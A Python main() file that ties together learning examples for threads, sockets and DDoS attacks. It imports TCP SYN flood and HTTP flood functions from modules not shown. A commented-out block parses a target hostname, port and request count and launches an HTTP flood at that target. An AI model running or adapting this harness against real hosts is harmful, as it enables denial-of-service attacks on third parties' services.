# This is our main() function for multi-thread
# programming examples in Python; Socket prog-
# ramming examples and ddos attacks examples:
# tcp syn flood attack and http flood attack.

import socket
import sys

from multithreading_programming_example import run_a_thread, run_threads
from socket_programming_example_client import socket_example_client
from socket_programming_example_server import socket_example_server
from tcp_syn_flood_attack import tcp_syn_flood_attack
from http_flood_attack import http_flood_attack


def main():
    """ Hello World example """
    print("Hello World!")

    """ Multi-thread programming examples in Python """
    """
    run_a_thread() # Run a single thread
    run_threads() # Run multiple threads
    """

    """ Socket Programming examples"""
    """
    socket_example_server() # Server side 
    #socket_example_client() # Client side
    """

    """ DDoS attack examples """
    """
    # Parse keyboard inputs
    num_requests = 0
    if len(sys.argv) == 2:
        disPort = 80
        num_requests = 100000000
    elif len(sys.argv) == 3:
        disPort = int(sys.argv[2])
        num_requests = 100000000
    elif len(sys.argv) == 4:
        disPort = int(sys.argv[2])
        num_requests = int(sys.argv[3])
    else:
        print("ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >")
        sys.exit(1)

    # Convert FQDN to IP address
    try:
        disIP = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    except socket.gaierror:
        print(" ERROR!\n Please enter a correct website address")
        sys.exit(2)

    http_flood_attack(disIP, disPort, num_requests)  # HTTP flood attack
    # tcp_syn_flood_attack(disIP, disPort, num_requests)  # TCP SYN flood attack
    
    
    """


if __name__ == '__main__':
    main()
